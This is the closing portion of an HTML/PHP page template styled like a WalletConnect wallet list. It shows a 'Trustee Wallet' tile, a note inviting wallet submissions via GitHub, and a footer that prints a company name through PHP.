                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1.jpeg" alt="Trustee Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trustee Wallet</div>
              </div>
            </a>

          </div>
        </div>
        <div class="mt-10"></div>
        <div class="text-gray-500">
          <p>
            Open an app submission issue on
            <a class="font-semibold text-blue-500 hover:text-cool-blue-600" href="#">
              <!-- -->
              GitHub
              <!-- -->
            </a>
            to add your wallet here.
          </p>
        </div>
        <footer>
          <center>
            All Rights Reserved <?= $company->name ?> @2022
          </center>
        </footer>
      </main>
    </div>
  </div>
</body>

</html>